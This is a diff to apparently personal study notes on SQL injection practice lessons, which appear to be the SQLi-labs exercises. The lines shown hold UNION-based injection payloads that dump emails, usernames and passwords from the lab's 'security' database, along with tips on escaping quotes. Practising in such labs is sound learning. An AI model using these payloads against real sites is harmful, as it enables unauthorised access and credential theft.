@@ -43,9 +43,11 @@ contents of database
 * when we put a ```'``` before and after the 1 it worked i.e ```?id='1'```
 * we can now comment ```--+``` rest and dump teh database using the same payloads (change 1' => '1') from lesson 1
 
-##PAYLOAD EXAMPLE
+#PAYLOAD EXAMPLE
 =================
+
 to find the data 	    	=``` /?id='-1' union select 1,group_concat(id),group_concat(email) from emails```
+
 contents of database
 --------------------
 * name of database=security
@@ -62,7 +64,9 @@ contents of database
 
 ##PAYLOAD EXAMPLE
 =================
+
 to find the data 	    	=``` /?id=-1') union select 1,group_concat(username),3 from users```
+
 contents of database
 --------------------
 name of database=security
@@ -76,6 +80,7 @@ LESS-4
 
 ##PAYLOAD EXAMPLE
 =================
+
 to find the data 	    	=``` /?id=-1") union select 1,group_concat(username),group_concat(password) from users```
 
 contents of database
